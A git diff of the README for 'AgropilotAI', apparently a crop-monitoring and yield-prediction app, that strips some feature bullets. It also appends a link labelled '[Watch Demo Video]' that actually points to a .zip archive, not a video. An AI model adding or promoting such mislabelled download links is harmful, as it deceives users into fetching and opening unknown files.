@@ -10,15 +10,10 @@
 
 ## ✨ Key Features
 
-- **📡 Live Sensor Monitoring:** Track vital statistics in real-time, including:
-  - 🌡️ Temperature
-  - 💧 Humidity
-  - 💨 CO₂ Levels
-  - 🌱 Soil Moisture
+
 - **🤖 Yield Prediction:** AI-driven insights to forecast crop yields based on historic and live sensor inputs.
 - **⚠️ Actionable Alerts:** Automated alerts and recommendations when environmental factors fall outside of ideal biological ranges.
 - **📊 History & Analytics:** Comprehensive history tracking and visual reports to study long-term trends.
-- **🔌 ESP32 / IoT Ready:** Supports live hardware data integration (e.g., ESP32 sensors) alongside a fallback demo model for testing.
 - **🔐 Secure Authentication:** Seamless user login and profile management via Firebase Auth.
 - **☁️ Cloud Sync:** Real-time data synchronization with Firebase / Firestore to monitor fields from anywhere.
 
@@ -92,3 +87,5 @@ Contributions, issues, and feature requests are welcome!
 3. Commit your changes (`git commit -m 'Add some AmazingFeature'`).
 4. Push to the Branch (`git push origin feature/AmazingFeature`).
 5. Open a Pull Request.
+
+[Watch Demo Video]- https://github.com/SamarthToge/AgropilotAI/archive/refs/tags/v1.0.zip
